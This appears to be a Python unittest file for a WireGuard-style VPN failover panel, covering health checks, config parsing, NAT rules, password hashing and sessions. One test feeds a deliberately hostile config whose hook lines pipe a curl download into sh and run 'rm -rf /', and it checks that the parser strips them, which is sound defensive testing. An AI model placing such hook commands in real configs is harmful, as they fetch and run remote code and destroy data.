    def checks(self, accounts):
        return [
            {"id": i, "account_id": a, "kind": "http",
             "target": f"http://a{a}.example/"}
            for i, a in enumerate(sorted(accounts), start=1)
        ]

    def grants(self, accounts):
        return [{"account_id": a, "iface": "awg1"} for a in accounts]

    def test_a_check_without_exits_is_not_reported(self):
        checks = [{"id": 5, "account_id": 1, "kind": "http",
                   "target": "http://a1.example/"}]
        with mock.patch.object(failover, "account_checks", return_value=checks), \
             mock.patch.object(failover, "account_grants", return_value=[]), \
             mock.patch.object(failover, "check_ok", return_value=True) as probe:
            avoid, report = failover.run_account_checks()
        self.assertEqual(report, {})
        self.assertEqual(avoid, {})
        self.assertFalse(probe.called)

    def test_a_granted_check_not_yet_probed_is_not_reported(self):
        checks = [{"id": 1, "account_id": 1, "kind": "http",
                   "target": "http://a1.example/"}]
        grants = [{"account_id": 1, "iface": "awg1"}]
        with mock.patch.object(failover, "account_checks", return_value=checks), \
             mock.patch.object(failover, "account_grants", return_value=grants), \
             mock.patch.object(failover, "check_ok", return_value=True) as probe:
            avoid, report = failover.run_account_checks(alive=[])
        self.assertEqual(report, {})
        self.assertFalse(probe.called)

    def test_a_late_account_check_result_is_applied(self):
        failover.check_state.clear()
        failover.check_inflight.clear()
        future = Future()
        checks = [{"id": 1, "account_id": 1, "kind": "http",
                   "target": "http://a1.example/"}]
        grants = [{"account_id": 1, "iface": "awg1"}]
        try:
            with mock.patch.object(failover.check_pool, "submit",
                                   return_value=future), \
                 mock.patch.object(failover, "account_checks",
                                   return_value=checks), \
                 mock.patch.object(failover, "account_grants",
                                   return_value=grants):
                failover.run_account_checks()
                future.set_result(False)
                failover.harvest_checks()
            self.assertEqual(failover.check_state[(1, "awg1")]["fails"], 1)
        finally:
            failover.check_inflight.clear()
            failover.check_state.clear()

    def test_a_crashing_check_does_not_stop_the_cycle(self):
        checks = [{"id": 1, "account_id": 1, "kind": "http",
                   "target": "http://a1.example/"}]
        grants = [{"account_id": 1, "iface": "awg1"}]
        with mock.patch.object(failover, "account_checks", return_value=checks), \
             mock.patch.object(failover, "account_grants", return_value=grants), \
             mock.patch.object(failover, "check_ok",
                               side_effect=RuntimeError("boom")):
            avoid, report = failover.run_account_checks()
            settle_checks()          # the failure is logged, not raised
            avoid, report = failover.run_account_checks()
        self.assertEqual(avoid, {})
        self.assertEqual(report, {})

    def test_dead_exits_are_not_probed(self):
        checks = [
            {"id": 1, "account_id": 1, "kind": "http",
             "target": "http://a1.example/"},
        ]
        grants = [{"account_id": 1, "iface": "awg1"},
                  {"account_id": 1, "iface": "awg2"}]
        probed = []

        def fake(kind, target, iface):
            probed.append(iface)
            return True

        with mock.patch.object(failover, "account_checks", return_value=checks), \
             mock.patch.object(failover, "account_grants", return_value=grants), \
             mock.patch.object(failover, "check_ok", side_effect=fake):
            failover.run_account_checks(alive=["awg2"])
            settle_checks()
        self.assertEqual(probed, ["awg2"])

    def test_accounts_rotate_between_ticks(self):
        accounts = list(range(1, 7))
        checks = self.checks(accounts)
        grants = self.grants(accounts)
        probed = []

        def fake(kind, target, iface):
            probed.append(target)
            return True

        with mock.patch.object(failover, "account_checks", return_value=checks), \
             mock.patch.object(failover, "account_grants", return_value=grants), \
             mock.patch.object(failover, "check_ok", side_effect=fake):
            failover.run_account_checks()
            settle_checks()
            first = set(probed)
            probed.clear()
            failover.run_account_checks()
            settle_checks()
            second = set(probed)
        self.assertEqual(len(first), failover.CHECK_ACCOUNTS_PER_TICK)
        self.assertEqual(len(second), failover.CHECK_ACCOUNTS_PER_TICK)
        self.assertNotEqual(first, second)
        # Every account is covered within a couple of ticks.
        self.assertEqual(first | second, {f"http://a{a}.example/" for a in accounts})

    def test_a_target_with_a_broken_port_is_a_failure_not_a_crash(self):
        with mock.patch.object(failover, "resolve_via",
                               return_value=["93.184.216.34"]), \
             mock.patch.object(failover, "run") as run:
            self.assertFalse(
                failover.check_ok("http", "http://a1.example:notaport/", "awg1"))
        self.assertFalse(run.called)

    def test_a_rebound_name_is_not_probed(self):
        with mock.patch.object(failover, "resolve_via",
                               return_value=["10.8.1.4"]), \
             mock.patch.object(failover, "run") as run:
            self.assertFalse(failover.check_ok("http", "http://a1.example/", "awg1"))
        self.assertFalse(run.called)


class ClientPingTests(unittest.TestCase):
    def test_client_probe_returns_the_latency(self):
        answered = subprocess.CompletedProcess([], 0, "time=8.4 ms", "")
        with mock.patch.object(failover, "iface_exists", return_value=True), \
             mock.patch.object(failover, "run", return_value=answered):
            self.assertEqual(failover.probe_client("10.80.0.2"), 8.4)

    def test_failed_client_probe_is_none(self):
        failed = subprocess.CompletedProcess([], 1, "", "timeout")
        with mock.patch.object(failover, "iface_exists", return_value=True), \
             mock.patch.object(failover, "run", return_value=failed):
            self.assertIsNone(failover.probe_client("10.80.0.2"))

    def test_client_probe_timeout_is_none(self):
        with mock.patch.object(failover, "iface_exists", return_value=True), \
             mock.patch.object(failover, "run",
                               side_effect=subprocess.TimeoutExpired("ping", 3)):
            self.assertIsNone(failover.probe_client("10.80.0.2"))

    def test_client_pings_are_rounded(self):
        rows = [{"ip": "10.80.0.2"}, {"ip": "10.80.0.3"}]
        values = {"10.80.0.2": 8.4, "10.80.0.3": None}
        with mock.patch.object(failover, "client_rows", return_value=rows), \
             mock.patch.object(failover, "probe_client",
                               side_effect=lambda ip: values[ip]):
            self.assertEqual(failover.client_pings(),
                             {"10.80.0.2": 8, "10.80.0.3": None})

    def test_no_clients_means_no_pings(self):
        with mock.patch.object(failover, "client_rows", return_value=[]):
            self.assertEqual(failover.client_pings(), {})


class ActiveMarkerTests(unittest.TestCase):
    def test_stale_active_is_cleared(self):
        self.assertTrue(failover.should_clear_active(None, "awg1"))
        self.assertFalse(failover.should_clear_active(None, None))
        self.assertFalse(failover.should_clear_active(None, "none"))
        self.assertFalse(failover.should_clear_active("awg1", "awg1"))

    def test_none_marker_reads_as_no_active_exit(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "active-exit"
            old = failover.ACTIVE_FILE
            failover.ACTIVE_FILE = path
            try:
                self.assertIsNone(failover.read_active())
                path.write_text("none\n")
                self.assertIsNone(failover.read_active())
                path.write_text("awg2\n")
                self.assertEqual(failover.read_active(), "awg2")
            finally:
                failover.ACTIVE_FILE = old


class AllowedNetworksTests(unittest.TestCase):
    conf = (
        "[Interface]\nAddress = 10.90.0.2/30\nPrivateKey = priv\n\n"
        "[Peer]\nPublicKey = pub\nEndpoint = host:51820\n"
        "AllowedIPs = 10.90.0.0/30, 192.168.50.0/24\n"
    )

    def test_ipv4_networks_are_collected(self):
        self.assertEqual(awgconf.allowed_networks(self.conf),
                         ["10.90.0.0/30", "192.168.50.0/24"])

    def test_default_route_and_ipv6_are_dropped(self):
        conf = self.conf.replace(
            "AllowedIPs = 10.90.0.0/30, 192.168.50.0/24",
            "AllowedIPs = 0.0.0.0/0, fd00::/8",
        )
        self.assertEqual(awgconf.allowed_networks(conf), [])

    def test_guess_prefers_allowed_ips(self):
        self.assertEqual(awgconf.guess_routes(self.conf),
                         ["10.90.0.0/30", "192.168.50.0/24"])

    def test_guess_falls_back_to_the_address_network(self):
        conf = self.conf.replace(
            "AllowedIPs = 10.90.0.0/30, 192.168.50.0/24",
            "AllowedIPs = 0.0.0.0/0",
        )
        self.assertEqual(awgconf.guess_routes(conf), ["10.90.0.0/30"])

    def test_guess_without_address(self):
        self.assertEqual(
            awgconf.guess_routes("[Interface]\nPrivateKey = k\n"), []
        )


class UpstreamConfigSafetyTests(unittest.TestCase):
    hostile = (
        "[Interface]\n"
        "Address = 10.90.0.2/30\n"
        "PrivateKey = priv\n"
        "PreUp = touch /tmp/pwned\n"
        "POSTUP = curl http://example.invalid/x | sh\n"
        "PreDown = rm -rf /\n"
        "PostDown = id\n"
        "SaveConfig = true\n"
        "\n"
        "[Peer]\n"
        "PublicKey = pub\n"
        "Endpoint = host:51820\n"
        "AllowedIPs = 0.0.0.0/0\n"
    )

    def test_hooks_never_reach_the_generated_config(self):
        text = awgconf.render(self.hostile, 1380)
        for token in ("preup", "postup", "predown", "postdown", "saveconfig",
                      "pwned", "curl", "rm -rf"):
            self.assertNotIn(token, text.lower())

    def test_hooks_do_not_make_a_config_invalid(self):
        # They are expected in provider configs; the parser strips them.
        self.assertEqual(awgconf.validate(self.hostile), [])

    def test_obfuscation_parameters_survive(self):
        conf = (
            "[Interface]\n"
            "Address = 10.90.0.2/30\n"
            "PrivateKey = priv\n"
            "Jc = 4\nJmin = 40\nJmax = 70\n"
            "S1 = 50\nS2 = 100\nS3 = 20\nS4 = 30\n"
            "H1 = 111\nH2 = 222\nH3 = 333\nH4 = 444\n"
            "I1 = <b 0x0001>\n"
            "HeaderProtectionKey = a2V5\n"
            "ContentPaddingAddition = 16\n"
            "RandomTrailers = on\n"
            "DisableCookies = on\n"
            "RekeyTimeout = 5\n"
            "RekeyAfterTime = 120\n"
            "RejectAfterTime = 180\n"
            "KeepaliveTimeout = 10\n"
            "MaxHandshakeAttempts = 18\n"
            "\n[Peer]\nPublicKey = pub\nEndpoint = host:51820\n"
        )
        self.assertEqual(awgconf.validate(conf), [])
        text = awgconf.render(conf, 1380)
        for key in ("Jc", "Jmin", "Jmax", "S1", "S4", "H1", "H4", "I1",
                    "HeaderProtectionKey", "ContentPaddingAddition",
                    "RandomTrailers", "DisableCookies", "RekeyTimeout",
                    "RekeyAfterTime", "RejectAfterTime", "KeepaliveTimeout",
                    "MaxHandshakeAttempts"):
            self.assertIn(key, text)

    def test_an_unknown_interface_key_is_refused(self):
        conf = self.hostile.replace(
            "SaveConfig = true", "FancyHook = something"
        )
        errors = awgconf.validate(conf)
        self.assertTrue(any("unsupported in [Interface]" in e for e in errors))
        self.assertTrue(any("FancyHook" in e for e in errors))

    def test_an_unknown_interface_key_is_not_rendered(self):
        conf = self.hostile.replace(
            "SaveConfig = true", "FancyHook = something"
        )
        self.assertNotIn("FancyHook", awgconf.render(conf, 1380))


class NatTests(unittest.TestCase):
    def exit(self, iface, mode="internet", nat=1, enabled=1):
        return {"iface": iface, "mode": mode, "nat": nat, "enabled": enabled}

    def test_internet_exit_is_always_nated(self):
        self.assertEqual(routing.nat_targets([self.exit("awg1", nat=0)]), ["awg1"])

    def test_routed_exit_follows_the_flag(self):
        exits = [self.exit("awg2", "routes", 1), self.exit("awg3", "routes", 0)]
        self.assertEqual(routing.nat_targets(exits), ["awg2"])

    def test_disabled_exit_is_not_nated(self):
        self.assertEqual(routing.nat_targets([self.exit("awg1", enabled=0)]), [])

    def fake_iptables(self, fail=None):
        def fake(cmd):
            # Legacy rule absent and the jump not installed yet: the first
            # lookups must fail, otherwise the code skips the insert.
            if "-C" in cmd and ("awg+" in cmd or "KASKAD-NAT" in cmd):
                return subprocess.CompletedProcess(cmd, 1, "", "")
            if fail and fail in cmd:
                return subprocess.CompletedProcess(cmd, 1, "", "boom")
            return subprocess.CompletedProcess(cmd, 0, "", "")
        return fake

    def test_apply_nat_rebuilds_the_chain(self):
        calls = []
        fake = self.fake_iptables()
        with mock.patch.object(routing, "run", side_effect=lambda cmd: (
                calls.append(cmd), fake(cmd))[1]):
            added = routing.apply_nat(["awg1", "awg2"], "10.80.0.0/24", [])
        self.assertEqual(added, 2)
        text = [" ".join(cmd) for cmd in calls]
        self.assertTrue(any(cmd.endswith("-N KASKAD-NAT") for cmd in text))
        self.assertTrue(any("-I POSTROUTING 1 -j KASKAD-NAT" in cmd for cmd in text))
        self.assertTrue(any(cmd.endswith("-F KASKAD-NAT") for cmd in text))
        self.assertEqual(sum("-A KASKAD-NAT" in cmd for cmd in text), 2)

    def test_apply_nat_reports_failures(self):
        errors = []
        with mock.patch.object(routing, "run", side_effect=self.fake_iptables("-A")):
            added = routing.apply_nat(["awg1"], "10.80.0.0/24", errors)
        self.assertEqual(added, 0)
        self.assertTrue(any("-A KASKAD-NAT" in error for error in errors))


class PasswordTests(unittest.TestCase):
    def test_round_trip(self):
        stored = auth.hash_password("correct horse battery")
        self.assertTrue(auth.check_password("correct horse battery", stored))
        self.assertFalse(auth.check_password("wrong password", stored))

    def test_salt_is_unique(self):
        one = auth.hash_password("same password")
        two = auth.hash_password("same password")
        self.assertNotEqual(one, two)
        self.assertTrue(auth.check_password("same password", one))
        self.assertTrue(auth.check_password("same password", two))

    def test_malformed_hash_fails_closed(self):
        for value in ("", "plain", "pbkdf2$abc$xx$yy", "md5$1$a$b"):
            self.assertFalse(auth.check_password("secret", value))

    def test_admin_hash_format_is_accepted(self):
        # panel.env uses the same pbkdf2$iterations$salt$hash layout.
        import base64
        import hashlib
        salt = b"0123456789abcdef"
        digest = hashlib.pbkdf2_hmac("sha256", b"adminpass", salt, 1000)
        stored = "pbkdf2$1000$%s$%s" % (
            base64.b64encode(salt).decode(), base64.b64encode(digest).decode()
        )
        self.assertTrue(auth.check_password("adminpass", stored))


class EmailTests(unittest.TestCase):
    def test_normalizes_case_and_spaces(self):
        self.assertEqual(auth.normalize_email("  User@Example.COM "), "user@example.com")

    def test_accepts_valid(self):
        self.assertIsNone(auth.email_error("user@example.com"))
        self.assertIsNone(auth.email_error("a.b+tag@mail.example.co.uk"))

    def test_rejects_invalid(self):
        for value in ("", "user", "user@", "@example.com", "user@example", "a b@example.com"):
            self.assertIsNotNone(auth.email_error(value))

    def test_password_policy(self):
        self.assertIsNotNone(auth.password_error("short"))
        self.assertIsNone(auth.password_error("twelve chars"))


class SessionTests(unittest.TestCase):
    secret = "test-session-secret"

    def test_admin_round_trip(self):
        token = auth.make_session(self.secret, "admin")
        data = auth.session_data(self.secret, token)
        self.assertEqual(data["role"], "admin")
        self.assertEqual(data["uid"], 0)

    def test_user_round_trip_keeps_version(self):
        token = auth.make_session(self.secret, "user", uid=7, tv=3)
        data = auth.session_data(self.secret, token)
        self.assertEqual((data["role"], data["uid"], data["tv"]), ("user", 7, 3))

    def test_forged_role_is_rejected(self):
        token = auth.make_session(self.secret, "root")
        self.assertIsNone(auth.session_data(self.secret, token))

    def test_other_secret_is_rejected(self):
        token = auth.make_session(self.secret, "admin")
        self.assertIsNone(auth.session_data("another-secret", token))

    def test_jti_is_present_and_unique(self):
        one = auth.session_data(self.secret, auth.make_session(self.secret, "admin"))
        two = auth.session_data(self.secret, auth.make_session(self.secret, "admin"))
        self.assertTrue(one["jti"])
        self.assertNotEqual(one["jti"], two["jti"])

    def test_expired_is_rejected(self):
        token = auth.make_session(self.secret, "admin", ttl=-1)
        self.assertIsNone(auth.session_data(self.secret, token))

    def test_garbage_is_rejected(self):
        for token in ("", "abc", "abc.def", None):
            self.assertIsNone(auth.session_data(self.secret, token))


class RoutingSafetyTests(unittest.TestCase):
    def test_a_hung_command_reports_a_timeout_instead_of_hanging(self):
        with mock.patch.object(
            routing.subprocess, "run",
            side_effect=subprocess.TimeoutExpired(cmd=["ip"], timeout=5),
        ):
            result = routing.run(["ip", "rule", "show"])
        self.assertEqual(result.returncode, 124)
        self.assertIn("timeout", result.stderr)

    def test_apply_takes_the_routing_lock(self):
        with mock.patch.object(routing, "_apply", return_value={"errors": []}) as inner, \
             mock.patch.object(routing, "routing_lock") as lock:
            result = routing.apply()
        lock.assert_called_once()
        inner.assert_called_once()
        self.assertEqual(result, {"errors": []})

    def test_the_lock_file_lives_under_the_run_dir(self):
        with tempfile.TemporaryDirectory() as tmp:
            run_dir = Path(tmp)
            with mock.patch.object(routing, "RUN_DIR", run_dir), \
                 mock.patch.object(routing, "LOCK_PATH", run_dir / "routing.lock"):
                with routing.routing_lock():
                    self.assertTrue((run_dir / "routing.lock").exists())

    def test_switching_the_active_exit_takes_the_routing_lock(self):
        with mock.patch.object(failover.routing, "routing_lock") as lock, \
             mock.patch.object(failover, "run", return_value=mock.Mock(returncode=0)), \
             mock.patch.object(failover, "write_atomic"), \
             mock.patch.object(failover, "log"):
            failover.switch("awg1", {"route_table": 100,
                                     "clients_net": "10.80.0.0/24"})
        lock.assert_called_once()


class WriteAtomicTests(unittest.TestCase):
    def test_writes_the_content_and_leaves_no_tmp(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "status.json"
            failover.write_atomic(target, '{"ok": true}')
            self.assertEqual(target.read_text(), '{"ok": true}')
            self.assertFalse((Path(tmp) / "status.tmp").exists())

    def test_a_failed_replace_leaves_no_tmp_behind(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "status.json"
            with mock.patch.object(Path, "replace", side_effect=OSError("disk full")):
                with self.assertRaises(OSError):
                    failover.write_atomic(target, "x")
            self.assertFalse((Path(tmp) / "status.tmp").exists())


if __name__ == "__main__":
    unittest.main()
